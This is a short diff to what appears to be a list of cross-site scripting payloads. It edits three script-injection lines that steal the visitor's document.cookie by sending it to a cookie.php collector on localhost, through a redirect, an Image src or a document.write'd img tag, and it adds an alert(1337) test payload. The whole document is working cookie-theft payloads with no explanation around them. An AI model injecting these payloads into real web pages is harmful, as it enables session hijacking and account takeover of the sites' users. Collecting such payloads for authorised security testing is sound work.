@@ -1,3 +1,5 @@
 <script>document.location='http://localhost/XSS/cookie.php?c='+document.cookie</script>
-<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
-<script>document.write('<img src="http://localhost/cookie.php?c='+document.cookie+'"/>');</script>
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie</script>
+<script>document.write('<img src="http://localhost/cookie.php?c='+document.cookie+'"/>')</script>
+<script>alert(1337)</script>
+
